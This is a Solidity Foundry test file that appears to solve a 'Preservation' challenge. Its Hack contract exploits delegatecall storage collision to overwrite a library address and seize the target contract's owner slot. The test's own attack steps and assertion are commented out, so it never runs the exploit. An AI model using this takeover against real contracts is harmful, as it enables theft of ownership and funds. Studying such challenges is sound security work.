// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation} from "../src/Preservation.sol";

contract Hack {
    // match the storage
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation _target) external {
        _target.setFirstTime(uint256(uint160(address(this)))); // for the delegatecall() 0th slot
        _target.setFirstTime(uint256(uint160(msg.sender))); // set as the attacker rather than the attack contract 2nd slot
        require(_target.owner() == msg.sender, "Hack failed");
    }

    // delegatecall() willl execute using this now, so mimic a setTime here
    function setTime(uint _time) public {
        owner = address(uint160(_time)); // trick the contract into setting the owner
    }
}

contract PreservationTest is Test {
    Preservation preservation;
    Hack hackContract;
    address attacker = makeAddr("attacker");
    address _timeZone1LibraryAddress = makeAddr("_timeZone1LibraryAddress"); 
    address _timeZone2LibraryAddress = makeAddr("_timeZone2LibraryAddress"); 

    function setUp() public {
        preservation = new Preservation(_timeZone1LibraryAddress, _timeZone2LibraryAddress);
        hackContract = new Hack();
    }

    function testAttackerCanBecomeTheOwner() public {
        // Switch context to the attacker's wallet
        vm.startPrank(attacker);

        // Verify the attacker is NOT the current owner
        address originalOwner = preservation.owner();
        assertTrue(originalOwner != attacker);

        // Step 1: Pass the Hack contract's real address to overwrite timeZone1Library
        // uint160 cast converts the address to a number that fits uint256
        // uint256 hackContractAddressAsUint = uint256(uint160(address(hackContract)));
        // preservation.setFirstTime(hackContractAddressAsUint);

        // Step 2: Call it again. Preservation now delegatecalls into Hack.setTime()
        // We pass the attacker's address to become the new owner
        // uint256 attackerAddressAsUint = uint256(uint160(attacker));
        // preservation.setFirstTime(attackerAddressAsUint);

        // hackContract.attack(preservation);


        // Verify the attack succeeded
        // assertEq(preservation.owner(), attacker);
        
        // vm.stopPrank();
    }
}
